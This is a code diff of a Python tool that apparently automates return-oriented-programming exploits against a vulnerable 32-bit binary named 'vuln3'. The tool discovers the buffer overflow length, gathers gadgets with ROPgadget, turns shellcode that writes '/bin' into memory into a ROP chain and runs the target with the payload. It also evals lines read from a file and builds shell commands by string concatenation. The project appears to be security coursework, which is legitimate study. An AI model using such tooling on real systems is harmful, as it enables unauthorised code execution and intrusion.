@@ -1,6 +1,7 @@
 import os
 import ROPcompile
-import ReverseExecutionASLR as RevExe
+import ReverseExecution as RevExe
+import sys
 
 BINARY_BITS = 32
 
@@ -14,17 +15,42 @@ SHELLCODE = ["pop edx", "@ .data", "pop eax", b'/bin', "mov dword ptr [edx], eax
 PROGRAM = "vuln3"
 FILE_MODE = True
 
-def main():
+def fileCheck(fileloc):
+    try:
+        f = open(fileloc, "r")
+        f.close()
+    except:
+        print("Could not open file " + fileloc + " for read")
+        quit()
+
+def main(args):
+    if len(args) != 3:
+        print("Expected 2 arguments, got " + str(len(args)-1))
+        print("Correct Usage: python S3CW.py BinaryFileLocation ShellcodeFileLocation")
+        quit()
+    fileCheck(args[1])
+    fileCheck(args[2])
+
+    global PROGRAM
+    PROGRAM = args[1]
     program = "./" + PROGRAM
     if FILE_MODE:
         program += " "
     else:
         program += " < "
 
+    global SHELLCODE
+    SHELLCODE = []
+    shellfile = open(args[2], "r")
+    for line in shellfile:
+        if(line[0:2] == "b'" and line[-2] == "'"):
+            SHELLCODE.append(eval(str(line).rstrip('\n')))
+        else:
+            SHELLCODE.append(str(line).rstrip('\n'))
+    print(SHELLCODE)
+
     #STEP 1 - Buffer Discovery
-    #bufferLength = bufferDiscovery(BINARY_SEARCH, program)
-    bufferLength = 44
-    print(bufferLength)
+    bufferLength = bufferDiscovery(BINARY_SEARCH, program)
     #STEP 2 - Create ROP Chain
     #ROPchain = createROPchain(COMMAND, bufferLength)
     ROPchain = makeROPchain(SHELLCODE, bufferLength)
@@ -137,18 +163,6 @@ def run(program, payload):
     command = program + payload
     return os.system(command)
 
-def createROPchain(command, bufflength):
-
-    #Find ROP gadgets
-    os.system("ROPgadget --binary " + PROGRAM + " > rop.txt")
-
-    #Write command as gadgets
-    payload = ROPcompile.CreateROPChain(command, bufflength, "rop.txt", BINARY_BITS)
-
-    #Write the payload
-    pfile = open("payload", "bw")
-    pfile.write(payload)
-
 def makeROPchain(shellcode, bufflength):
 
     #Find ROP gadgets
@@ -159,15 +173,6 @@ def makeROPchain(shellcode, bufflength):
     ROPcompile.LoadGadgetDictionary("rop.txt", dictionary)
     gadgets = dictionary.keys()
     payload = RevExe.create(shellcode, gadgets)
-    #for i, _ in enumerate(payload):
-        #if type(payload[i]) is bytes:
-            #payload[i] = payload[i]
-            #continue
-        #if payload[i][0] == '@':
-            #payload[i] = ReverseExecution.generalToBytes(ROPcompile.dataaddressToValue(payload[i]) + 0x080da060)
-            #continue
-        #payload[i] = ReverseExecution.generalToBytes(int(dictionary.get(payload[i]),0))
-    #bpayload = b''.join(payload)
     bpayload = ROPcompile.AssemblyListToGadgets(payload, bufflength, dictionary)
     print(payload)
     print(bpayload)
@@ -178,4 +183,4 @@ def makeROPchain(shellcode, bufflength):
 
 
 if __name__ == "__main__":
-    main()
+    main(sys.argv)
